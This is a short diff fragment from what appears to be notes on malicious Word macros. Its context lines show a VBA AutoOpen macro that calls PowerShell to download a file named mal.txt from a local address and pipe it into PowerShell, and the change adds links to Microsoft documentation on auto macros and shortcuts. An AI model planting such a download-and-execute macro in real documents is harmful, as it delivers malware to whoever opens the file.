@@ -28,3 +28,8 @@ Sub AutoOpen()
     Shell ("powershell /c ""(Invoke-WebRequest ""http://127.0.0.1:8080/mal.txt"").Content | powershell"" ")
 End Sub
 '''
+
+## Useful links to refer to
+https://docs.microsoft.com/en-us/office/vba/word/concepts/customizing-word/auto-macros
+
+https://docs.microsoft.com/en-us/troubleshoot/windows-client/admin-development/create-desktop-shortcut-with-wsh
